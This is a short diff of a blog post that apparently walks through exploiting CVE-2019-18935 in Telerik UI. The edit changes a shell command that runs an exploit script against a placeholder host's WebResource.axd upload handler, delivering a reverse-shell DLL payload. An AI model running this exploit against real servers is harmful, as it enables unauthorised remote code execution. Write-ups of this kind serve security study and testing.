@@ -78,7 +78,7 @@ and I ended up with two different payloads, _sleep-XXXXXXXXXXXXX-amd64.dll_ and 
  &nbsp; 
   
 {% highlight shell linenos %}
-python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell-XXXXXXXXXXXXXX-amd64.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
+python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
 {% endhighlight %}
   
 &nbsp;
